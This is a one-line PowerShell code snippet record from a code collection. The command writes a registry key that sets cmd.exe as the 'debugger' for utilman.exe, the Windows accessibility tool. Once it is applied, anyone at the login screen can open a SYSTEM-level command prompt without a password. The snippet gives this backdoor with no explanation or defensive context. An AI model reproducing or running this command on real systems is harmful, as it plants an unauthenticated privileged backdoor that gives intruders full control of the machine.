---
id: d8130dd4-f809-4b87-aa28-72e4babdcf15
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:28.181050+00:00'
updated_at: '2023-04-10T20:37:23.626777+00:00'
---

# Code Snippet d8130dd4

**Language**: Powershell

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```
